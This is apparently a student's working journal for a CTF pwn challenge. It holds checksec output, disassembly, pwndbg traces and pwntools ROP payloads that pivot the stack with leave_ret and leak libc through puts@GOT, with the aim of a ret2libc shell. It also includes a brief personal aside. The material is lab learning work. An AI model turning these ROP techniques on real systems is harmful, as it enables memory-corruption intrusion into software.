```
┌──(kali㉿kali)-[~/Desktop/CTF/silenceWall]
└─$ checksec ./program
[*] '/home/kali/Desktop/CTF/silenceWall/program'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

```

pop next(libc(...)) into the system to get a shell

# to do:

1. leak the libc with simple small rop chain 

# observations 

the program is quite similar to barelimit. 
1. my_read has 2 parameters which I might be able to determine the size of my own buffer ( if I manage to go in again)
2. the very first my_read(forced)
```c
my_read(buffer,0x30);
```
allows just 48 bytes 

```as
   0x0000000000400842 <+0>:     push   rbp
   0x0000000000400843 <+1>:     mov    rbp,rsp
   0x0000000000400846 <+4>:     sub    rsp,0x10
   0x000000000040084a <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x000000000040084e <+12>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400852 <+16>:    mov    rdx,QWORD PTR [rbp-0x10]
   0x0000000000400856 <+20>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040085a <+24>:    mov    rsi,rax
   0x000000000040085d <+27>:    mov    edi,0x0
   0x0000000000400862 <+32>:    call   0x4005b0 <read@plt>
   0x0000000000400867 <+37>:    nop
   0x0000000000400868 <+38>:    leave
   0x0000000000400869 <+39>:    ret
End of assembler dump.
```
we need 8 bytes to get to rbp

8 padding to rbp 
(40 left) i.e. just 5 messages left 
for this challenge we need like 

```py
payload = flat(
    buf, #8

    pop_rsi, # 8
    buf, # 8 
    size, # 8
    my_read, # 8

    leave_ret # 8
)
```
which is at least 6 * 8 = 48 bytes
oh but its not the case if we go to leave_messages... we dont need 6!

1. leave_messages_with_great_care
```
Dump of assembler code for function leave_messages_with_great_care:
   0x000000000040086a <+0>:     push   rbp
   0x000000000040086b <+1>:     mov    rbp,rsp
   0x000000000040086e <+4>:     sub    rsp,0x30
   0x0000000000400872 <+8>:     mov    eax,DWORD PTR [rip+0x2017d4]        # 0x60204c <collapsed>
   0x0000000000400878 <+14>:    test   eax,eax
   0x000000000040087a <+16>:    je     0x400892 <leave_messages_with_great_care+40>
   0x000000000040087c <+18>:    lea    rdi,[rip+0x735]        # 0x400fb8
   0x0000000000400883 <+25>:    call   0x400590 <puts@plt>
   0x0000000000400888 <+30>:    mov    edi,0x0
   0x000000000040088d <+35>:    call   0x4005d0 <exit@plt>
   0x0000000000400892 <+40>:    lea    rdi,[rip+0x747]        # 0x400fe0
   0x0000000000400899 <+47>:    call   0x400590 <puts@plt>
   0x000000000040089e <+52>:    lea    rax,[rbp-0x30]
   0x00000000004008a2 <+56>:    mov    esi,0x60
   0x00000000004008a7 <+61>:    mov    rdi,rax
   0x00000000004008aa <+64>:    call   0x400842 <my_read>
   0x00000000004008af <+69>:    mov    DWORD PTR [rip+0x201793],0x1        # 0x60204c <collapsed>
   0x00000000004008b9 <+79>:    nop
   0x00000000004008ba <+80>:    leave
   0x00000000004008bb <+81>:    ret
```
there is also a function called `leave_messages_with_great_care` 

it :
- takes 48 bytes to get to rbp 
- calls my_read with 96 bytes 
- i guess this is where my ROP chain starts 
- can only be visited once

I am thinking about starting my rop chain in the first `my_read` (but just 4 messages), return to `leave_messages_with_great_care` (6 messages to write and ). next I am jumping back to my_read i guess 



```
 ► 0x400862 <my_read+32>                          call   read@plt                    <read@plt>
        fd: 0 (pipe:[592142])
        buf: 0
        nbytes: 0x602520 ◂— 0

```

# discoveries
from `leave_messages_...` to `buf1`, it was not successful
```
 ► 0x400862 <my_read+32>                          call   read@plt                    <read@plt>
        fd: 0 (pipe:[592142])
        buf: 0
        nbytes: 0x602520 ◂— 0
```



# my undestanding into the problem 

1. we write stuff with my_read, size(second argument controllable but not easy to call and write)
2. if not written, I guess it uses whatever value rsi was at the moment (which may idff from diff libc version)
3. my_read is naturally called in one time in `main` and `leav_messag...` with fixed writing size (but in this call, my read itself can be overflew i guess)
4. my_read in main writes exactly the size of `buffer` variable created, maybe not be able to overflow
5. my read in `leave_...` can overflows 48 bytes ( 6 lines)
6. `main` and `leave_` can only be visited once to prevent direct ROP
7. `leave_...` can be overflew with 48 bytes certainly 


```
 RDI  0x602520 ◂— 0
 RSI  0x7ffed2e9bbd0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %`'
 ```

 `rsi` from `leave..` to `my_read` seems to be the buffer in `leave...` 


 ```
  ► 0x400862 <my_read+32>                          call   read@plt                    <read@plt>
        fd: 0 (pipe:[731172])
        buf: 0x602520 ◂— 0
        nbytes: 0x7ffed2e9bbd0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %`'

```


I was watching a TV show with my mother and it felt pretty good, the show was funny and it was good time. I totally enjoyed it lol 
But now it's time to move now, never invest too much on entertainment! 



# Journal on 9a
not so sure if it was exactly how it works or if it is what the challenge expects, again got lucky this time
- the main problem to me was that initial buffer in `leave_messages_with_great_care` (48 bytes left in 96 bytes after padding up to rbp)
- since `my_read` function expects two arguments, one in `rdi` and one in `rsi`. So I was doing `pop rdi ; ret` + `buf1` + `pop rsi ; ret` + `input_size` + `dummy for r15` + `elf.sym['my_read']`and of course the buffer size was not enough 
- then i stared and ran `ni` in pwndbg for quite a while until i found out that padding 48 bytes padding earlier would become the `rsi` i.e. the `input_size` of `my_read` somehow, so I just did

```py
payload1 = flat(
    # 96 bytes to write in this payload 
    b'1' * 0x30,    # padding to rbp, 48 bytes, this would somehow be the rsi lol
    buf1,           # rbp of next stack frame

    # preparing and moving to the next frame 
    pop_rdi_ret,
    buf1,
    elf.sym['my_read'], 

    leave_ret
)
```
as my first payload

I am now still pretty clueless on payload 2 (haven't checked pwndbg on how it works yet)
```py
payload2 = flat(
    # 96 bytes to write 
    buf2,   # rbp of the next frame, this gets popped and ROP chain continues(supposed)

    # leaking the libc addresses
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'], # should print out the libc addresses

    # preparing and moving to the next frame 

    
    pop_rdi_ret,
    buf2,
    elf.sym['my_read'],
    leave_ret
)
p.send(payload2)
```

So i was just testing if 
```py
    pop_rdi_ret,
    buf2,
    elf.sym['my_read'],
    leave_ret
```
in this case would somehow work while not giving anything as 2nd argument (indeed it worked somehow lol, I guess i am lucky that some random and suitable value on stack goes into `rdi`. I would check check pwndbg on that later) 

